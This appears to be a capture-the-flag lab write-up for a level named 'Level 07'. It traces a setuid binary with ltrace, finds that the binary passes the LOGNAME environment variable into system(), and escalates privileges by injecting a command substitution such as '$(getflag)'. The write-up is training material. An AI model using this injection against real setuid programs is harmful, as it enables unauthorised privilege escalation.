# Level 07

## Initial Context

- A single file: `level07`

## Solving the Challenge

### Analyzing

```bash
$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Executing `level07` seems to only display `level07`.

```bash
$ ./level07
level07
$ ./level07 hello
level07
$ ./level07 hello world
level07
```

Using `ltrace` to trace system calls, we can learn a little bit more. It seems that it print the `LOGNAME` environment variable.

```bash
$ ltrace ./level07
...
getenv("LOGNAME") = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff62, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07") = 0
...
```

Changing the value can confirm it:

```bash
$ LOGNAME=hello ltrace ./level07
...
getenv("LOGNAME") = "hello"
asprintf(0xbffff744, 0x8048688, 0xbffff917, 0xb7e5ee55, 0xb7fed280) = 16
system("/bin/echo hello") = 0
...
```

### Exploiting

Using a sub-shell, we should be able to get the flag.

```bash
$ LOGNAME='$(id)' ./level07
uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
```

Perfect! We should be able to get the flag:

```bash
$ LOGNAME='$(getflag)' ./level07
Check flag.Here is your token : ....
```